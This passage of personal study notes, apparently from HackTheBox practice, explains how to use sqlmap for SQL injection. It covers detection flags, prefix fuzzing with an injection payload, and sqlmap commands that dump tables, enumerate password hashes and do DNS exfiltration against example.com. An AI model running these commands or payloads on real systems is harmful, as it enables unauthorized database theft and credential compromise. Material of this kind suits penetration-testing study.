learned
6. If you can see the DB output and want to abuse `UNION`. Try to enumerate the prefixes.
7. for `UNION`technique choose extended test not the basic test so you can get big numbers of UNIONS. 

## Tips
- Detecting Database type will reduce your time too much.
- Do some manual tests to detect what is the difference in the page, so you can use it in sqlmap.
- Use `~/.opt/wordlist/sql_prefixes_wordList.txt` append to it a payload in burp to detect what prefix is used.
- When you giveup, use `--technique T` it will detect if some thing is vuln but it take time.

| flag             | Description                                                                                                                                                                                                                               |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-r`             | specify the file contains the request.                                                                                                                                                                                                    |
| `--batch`        | used for skipping any required user-input, by automatically choosing using the default option.                                                                                                                                            |
| `--level`        | 5 give more prefixes and suffixes `boundaries` (eg. `1')) AND 1049=6686 AND (('`), and more `vectors` --> (eg. `UNION ALL SELECT 1,2,VERSION()`)<br>by using level 5 there will be too much things to test. So make the detection slower. |
| `--risk`         | payloads may damege DB.                                                                                                                                                                                                                   |
| `--Technique`    | `BEUSTQ`. Boolean, Error, Union, Stacked, Time-based, inline-queries                                                                                                                                                                      |
| `--string="abc"` | use a known string that indicates a true/false page change to reduce false positives.                                                                                                                                                     |
## Detection
```sh
sqlmap -r req.txt --level 5 --risk 3 --dbms=MySQL --dump --batch #someTimes remove --batch
```
- It may detect unusual prefix or suffix. Play with that using manual test so you may be able to escape and use UNION. So try to put using flags for further testing to be easier.
	- `select * from users where ((id="GET['ID']"))`  --> escape this used prefix `"))`. now you can use UNION based.
	- `~/.opt/wordlist/sql_prefixes_wordList.txt` use this wordlist in burp to fuzz the prefix.
	- `GET /case6.php?col=id§'§+or+1=1--+- HTTP/1.1`
### Union based
Union based need more `manual` flags. such as datatype you want to use when do `UNION` by default its number but DB may use strings instead.

| Flag               | Description                                     |
| ------------------ | ----------------------------------------------- |
| `--union-cols`=1   | specify number of columns in query              |
| `--union-char`='a' | specify character that we will put in the query |
|                    |                                                 |



---

## Exploitation


| Flag                                                                                                                                                                                                             | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| -a, --all<br>-b, --banner<br>--current-user<br>--current-db<br>--hostname<br>--is-dba<br>--users<br>--passwords<br>--privileges<br>--roles<br>--dbs<br>--tables<br>--columns<br>--schema<br>--dump<br>--dump-all | Retrieve everything<br>Retrieve DBMS banner<br>Retrieve DBMS current user <br>Retrieve DBMS current database<br>Retrieve DBMS server hostname<br>Detect if the DBMS current user is DBA <br>Enumerate DBMS users <br>Enumerate DBMS users password hashes<br>Enumerate DBMS users privileges<br>Enumerate DBMS users roles<br>Enumerate DBMS databases <br>Enumerate DBMS database tables<br>Enumerate DBMS database table columns<br>Enumerate DBMS schema<br>dump all content from the current database<br>dump all content from all databases. |
| -D DB<br>-T TBL<br>-C COL<br>-X EXCLUDE<br>-U USER                                                                                                                                                               | DBMS database to enumerate<br>DBMS database table(s) to enumerate<br>DBMS database table column(s) to enumerate<br>DBMS database identifier(s) to not enumerate<br>DBMS user to enumerate                                                                                                                                                                                                                                                                                                                                                         |
| -C columnName1,columnName2<br>--start=2 --stop=3<br>--where                                                                                                                                                      | Specify which columns you want to get back as result<br>Limit number of retrived data.<br>specify where retrival condition                                                                                                                                                                                                                                                                                                                                                                                                                        |
| --passwords                                                                                                                                                                                                      | get the DB users passwords                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| --dns-domain                                                                                                                                                                                                     | DNS exfiltration                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| --search -T user<br>--search -C pass<br>                                                                                                                                                                         | search for table look like user<br>search for column look like pass                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
|                                                                                                                                                                                                                  |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |


```shell-session
slomkm@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D testdb -T users -C name,surname
```

complete overView over DB
```shell-session
slomkm@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema
```

search for specific table or column
```shell-session
slomkm@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
slomkm@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

DB Users Password Enumeration and Cracking
```shell-session
slomkm@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

